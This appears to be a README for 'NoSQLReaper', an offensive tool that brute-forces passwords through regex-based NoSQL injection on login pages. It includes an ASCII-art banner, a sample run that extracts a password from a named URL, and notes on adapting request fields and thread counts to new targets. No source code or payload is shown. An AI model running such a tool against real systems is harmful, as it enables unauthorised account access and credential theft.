# NoSQLReaper

NoSQL Injection Brute-Forcer

# Usage

NoSQLReaper is a multi-threaded NoSQL Injection brute-force tool designed to exploit regex-based authentication bypass in vulnerable NoSQL databases.

It systematically discovers valid password characters for NoSQL-based login systems and extracts full credentials with high efficiency.

                                                                                                                                                                                                                                                
    ┌──(kali㉿kali)-[~/NoSQLReaper]
    └─$ python NoSQLReaper.py



      .     .       .  .   . .   .   . .    +  .
      .     .  :     .    .. :. .___---------___.
           .  .   .    .  :.:. _".^ .^ ^.  '.. :"-_. .
        .  :       .  .  .:../:            . .^  :.\.
            .   . :: +. :.:/: .   .    .        . . .:\
     .  :    .     . _ :::/:               .  ^ .  . .:\
      .. . .   . - : :.:./.                        .  .:\
      .      .     . :..|:                    .  .  ^. .:|
        .       . : : ..||        .                . . !:|
      .     . . . ::. ::\(                           . :) /
     .   .     : . : .:.|. ######              .#######::|
      :.. .  :-  : .:  ::|.#######           ..########:|
     .  .  .  ..  .  .. :\ ########          :######## :/
      .        .+ :: : -.:\ ########       . ########.:/
        .  .+   . . . . :.:\. #######       #######..:/
          :: . . . . ::.:..:.\           .   .   ..:/
       .   .   .  .. :  -::::.\       | |     . .:/
          .  :  .  .  .-:.":.::.\             ..:/
     .      -.   . . . .: .:::.:.\           .:/
    .   .   .  :      : ....::_:..:\   ___.  :/
       .   .  .   .:. .. .  .: :.:.\       :/
         +   .   .   : . ::. :.:. .:.|\  .:/|
         .         +   .  .  ...:: ..|  --.:|
    .      . . .   .  .  . ... :..:.."(  ..)"
     .   .       .      :  .   .: ::/  .  .::\

    Enter the target URL: https://netrunner021.com/login.php

    🛸 NoSQLReaper - The NoSQL Injection Brute-Forcer 🛸

    [+] Found character: S
    [+] Found character: Su
    [+] Found character: Sup
    [+] Found character: Supe
    [+] Found character: Super
    [+] Found character: SuperS
    [+] Found character: SuperSe
    [+] Found character: SuperSec
    [+] Found character: SuperSecr
    [+] Found character: SuperSecr3
    [+] Found character: SuperSecr3t
    [*] NoSQLReaper Found Password: SuperSecr3t


# Features

- Automated NoSQLi Brute-Force – Finds passwords character by character.

- Multi-Threaded – Faster execution using concurrent requests.

- Regex-Based Injection – Exploits $regex authentication bypass in MongoDB & other NoSQL databases.

- Customizable Targeting – Works on different login pages with minor modifications.

# Strong Validation Check

- Only accept success if the Location header points to a valid page.
- Check if JSON explicitly contains success: true instead of relying on vague checks.
- Reject responses that contain common error messages.


# Note

- Password length is set to 11 but can be decreased/increased if needed.

- The user, pass, variables and their values (except the pass value) may need to be modified based on the target browser, as each website's request and response structure can differ.

- These modifications should be made in the source code.

- Additionally, since this script is designed to enforce a character limit of 11, if the target password is shorter than 11 characters, it will append $ to meet the required length.

- Setting the thread value above 15 may result in false positives due to request overlap or improper response handling, affecting accuracy. It is recommended to keep the thread count at a reasonable level to ensure reliable results.
